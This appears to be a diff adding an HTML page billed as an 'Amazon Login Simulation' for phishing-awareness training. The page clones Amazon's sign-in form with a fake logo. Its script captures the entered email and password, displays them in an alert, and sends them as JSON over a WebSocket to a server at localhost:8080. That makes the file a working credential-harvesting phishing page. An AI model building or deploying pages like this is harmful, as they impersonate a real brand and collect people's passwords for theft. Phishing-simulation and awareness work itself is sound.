@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Login Simulation</title>
+    <link rel="icon" href="Images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <img src="Images/fake-amazon-logo.png" alt="Amazon Logo" class="logo">
+        <form id="login-form">
+            <h2>Sign-In</h2>
+            <div class="input-group">
+                <label for="email">Email or mobile phone number</label>
+                <input type="text" id="email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="signin-button">Sign-In</button>
+            <p class="forgot-password"><a href="https://www.amazon.in/signin" target="_blank">Forgot your password?</a></p>
+        </form>
+    </div>
+    <script>
+        // Establish WebSocket connection to the server
+        const socket = new WebSocket('ws://localhost:8080');
+
+        // Log WebSocket connection errors
+        socket.onerror = function (error) {
+            console.error('WebSocket Error:', error);
+        };
+
+        // Log WebSocket connection open
+        socket.onopen = function (event) {
+            console.log('WebSocket connection established.');
+        };
+
+        // Handle form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Simulate capturing user data (for training purposes only)
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Display a fake phishing warning message
+            alert('This was a phishing simulation.\n\nYour email: ' + email + '\nYour password: ' + password + '\n\nRemember: Never enter your credentials on a suspicious site!');
+
+            // Send captured data to the server over WebSocket
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(JSON.stringify({ email: email, password: password }));
+            } else {
+                console.error('WebSocket connection not open. Unable to send data.');
+            }
+        });
+    </script>
+</body>
+</html>
